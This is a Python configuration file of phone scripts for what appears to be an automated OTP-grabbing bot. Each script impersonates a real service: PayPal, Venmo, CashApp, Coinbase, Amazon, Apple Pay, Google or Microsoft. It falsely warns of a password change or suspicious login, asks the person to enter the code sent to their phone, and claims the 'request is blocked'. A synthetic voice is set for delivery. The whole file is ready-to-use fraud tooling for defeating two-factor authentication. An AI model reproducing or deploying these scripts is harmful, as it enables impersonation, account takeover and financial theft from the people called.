
# Voice:en-US-JennyNeural
# Number of digits to capture: {otp}
dcall = {
    "script": "dcall",
    "intro": "Hey {name}, we are calling from {servicename} and we have received an request to change the password of your {servicename} account, if not you then press 1",
    "enter_otp": "Please enter the {otp} digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the {digits} digit code sent to your mobile number.",
    "end_phase": "Thank you for using {servicename}",
    "voice": "en-US-JennyNeural"
}
# #  Command: /paypal
paypal = {
    "script": "paypal",
    "intro": "Hey {name}, we are calling from Paypal and we have received an request to change the password of your Paypal account, if not you then press 1",
    "enter_otp": "Please enter the 6 digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the 6 digit code sent to your mobile number.",
    "end_phase": "Thank you for using Paypal",
    "voice": "en-US-JennyNeural",
    "digits": 6
}



venmo = {
    "script": "venmo",
    "intro": "Hey {name}, we are calling from Venmo and we have received an request to change the password of your Venmo account, if not you then press 1",
    "enter_otp": "Please enter the 4 digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the 4 digit code sent to your mobile number.",
    "end_phase": "Thank you for using Venmo",
    "voice": "en-US-JennyNeural",
    "digits": 4
}

cashapp = {
    "script": "cashapp",
    "intro": "Hey {name}, we are calling from CashApp and we have noticed suspicious login activity at your CashApp profile, if not done by you press 1",
    "enter_otp": "Please enter the {otp} digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the {otp} digit code sent to your mobile number.",
    "end_phase": "Thank you for using CashApp",
    "voice": "en-US-JennyNeural"
}

# #  Command: /call
# ==========================================================================================================================


coinbase = {
    "script": "coinbase",
    "intro": "Hey {name}, we are calling from Coinbase Fraud detection line, we have received suspicious login activity to your coinbase account, if not done by you press 1",
    "enter_otp": "Please enter the {otp} digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the {otp} digit code sent to your mobile number.",
    "end_phase": "Thank you for using Coinbase",
    "voice": "en-US-JennyNeural",
}

# ==========================================================================================================================

amazon = {
    "script": "amazon",
    "intro": "Hey {name}, we are calling from Amazon Customer Support line, we have received suspicious login activity to your amazon account, if not done by you press 1",
    "enter_otp": "Please enter the 6 digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the 6 digit code sent to your mobile number.",
    "end_phase": "Thank you for using Amazon",
    "voice": "en-US-JennyNeural",
    "digits": 6
}

# ==========================================================================================================================

applepay = {
    "script": "applepay",
    "intro": "Hey {name}, we are calling from Apple Pay Support Team, we have received suspicious transaction activity to your Apple Pay account, if not done by you press 1",
    "enter_otp": "Please enter the 6 digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the 6 digit code sent to your mobile number.",
    "end_phase": "Thank you for using Apple Pay",
    "voice": "en-US-JennyNeural",
    "digits": 6
}
# ==========================================================================================================================

email = {
    "script": "email",
    "intro": "Hey {name}, we are calling from Google, we have received suspicious login activity to your Gmail account, if not done by you press 1",
    "enter_otp": "Please enter the 6 digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the 6 digit code sent to your mobile number.",
    "end_phase": "Thank you for using Gmail",
    "voice": "en-US-JennyNeural",
    "digits": 6
}

# ===========================================================================================================================

microsoft = {
    "script": "microsoft",
    "intro": "Hey {name}, we are calling from Microsoft Fraud Detection Team, we have received suspicious login activity to your Microsoft account, if not done by you press 1",
    "enter_otp": "Please enter the 6 digit code sent to your mobile number",
    "verifying": "Please wait while we verify your code.",
    "valid_otp": "The code you entered is valid, request is blocked",
    "wrong_otp": "The code you entered is invalid, Please enter the 6 digit code sent to your mobile number.",
    "end_phase": "Thank you for using Microsoft",
    "voice": "en-US-JennyNeural",
    "digits": 6
}

all_scripts = {
    "dcall": dcall,
    "paypal": paypal,
    "cashapp": cashapp,
    "coinbase": coinbase,
    "amazon": amazon,
    "applepay": applepay,
    "email": email,
    "microsoft": microsoft,
    "venmo": venmo
}